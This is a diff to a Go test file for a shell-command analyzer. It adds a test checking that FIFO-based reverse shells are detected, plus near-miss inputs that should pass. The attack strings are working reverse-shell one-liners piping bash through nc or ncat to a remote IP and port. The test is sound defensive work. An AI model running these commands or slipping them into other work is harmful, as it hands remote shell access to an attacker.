@@ -3,6 +3,7 @@ package analysis_test
 import (
 	"context"
 	"errors"
+	"path"
 	"testing"
 
 	"github.com/nullptrpanic/libcommand"
@@ -18,6 +19,8 @@ var (
 	_ libcommand.Command = analysis.Init
 	_ libcommand.Command = analysis.Telinit
 	_ libcommand.Command = analysis.Systemctl
+	_ libcommand.Command = analysis.Mkfifo
+	_ libcommand.Command = analysis.Cat
 	_ libcommand.Command = analysis.NC
 	_ libcommand.Command = analysis.Ncat
 	_ libcommand.Command = analysis.Netcat
@@ -179,6 +182,62 @@ func TestAnalysisSeesCommandsNestedThroughExecutionWrappers(t *testing.T) {
 	var detection *analysis.DetectionError
 	if !errors.As(err, &detection) || detection.Command != "rm" {
 		t.Fatalf("detection = %#v, want nested rm invocation", detection)
+	}
+}
+
+func TestSessionDetectsFIFOReverseShellWithoutTrace(t *testing.T) {
+	commands := map[string]libcommand.Command{
+		"rm":     analysis.RM,
+		"mkfifo": analysis.Mkfifo,
+		"cat":    analysis.Cat,
+		"bash":   analysis.Shell,
+		"sh":     analysis.Shell,
+		"nc":     analysis.NC,
+		"ncat":   analysis.Ncat,
+	}
+	lookup := func(name string) libcommand.Command {
+		return commands[path.Base(name)]
+	}
+	simulateWithSession := func(source string) error {
+		session := analysis.NewSession()
+		middleware := func(next libcommand.Command) libcommand.Command {
+			return func(ctx context.Context, shell *libcommand.CommandContext, invocation *libcommand.Invocation) (*libcommand.CommandResult, error) {
+				if err := analysis.Inspect(ctx, shell, invocation, lookup(invocation.Name)); err != nil {
+					return nil, err
+				}
+				return next(ctx, shell, invocation)
+			}
+		}
+		ctx := analysis.WithSession(context.Background(), session)
+		return libcommand.NewBuilder().
+			Middleware(middleware).
+			Build().
+			Simulate(ctx, &libcommand.SimulationRequest{Source: source})
+	}
+
+	attacks := []string{
+		`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 101.132.185.173 18889 > /tmp/f`,
+		`mkfifo /tmp/f; if maybe; then cat /tmp/f | sh -i | ncat host 18889 > /tmp/f; fi`,
+	}
+	for _, attack := range attacks {
+		err := simulateWithSession(attack)
+		var detection *analysis.DetectionError
+		if !errors.As(err, &detection) || detection.Type != analysis.RiskTypeReverseShell {
+			t.Fatalf("attack %q: error = %v, detection = %#v; want reverse_shell", attack, err, detection)
+		}
+	}
+
+	safe := []string{
+		"mkfifo /tmp/f\ncat /tmp/f\nbash -i <<< \"$UNRESOLVED\"\nnc host 18889 <<< \"$UNRESOLVED\" > /tmp/f",
+		"mkfifo /tmp/f\ncat /tmp/f\nbash -i\nnc host 18889 > /tmp/f",
+		`mkfifo /tmp/f; cat /tmp/f | bash -i </tmp/input | nc host 18889 > /tmp/f`,
+		`mkfifo /tmp/f; cat /tmp/f | bash -i | nc host 18889 > /tmp/other`,
+		`mkfifo /tmp/f; rm -f /tmp/f; cat /tmp/f | bash -i | nc host 18889 > /tmp/f`,
+	}
+	for _, source := range safe {
+		if err := simulateWithSession(source); err != nil {
+			t.Fatalf("safe source %q returned %v, want no detection", source, err)
+		}
 	}
 }
 
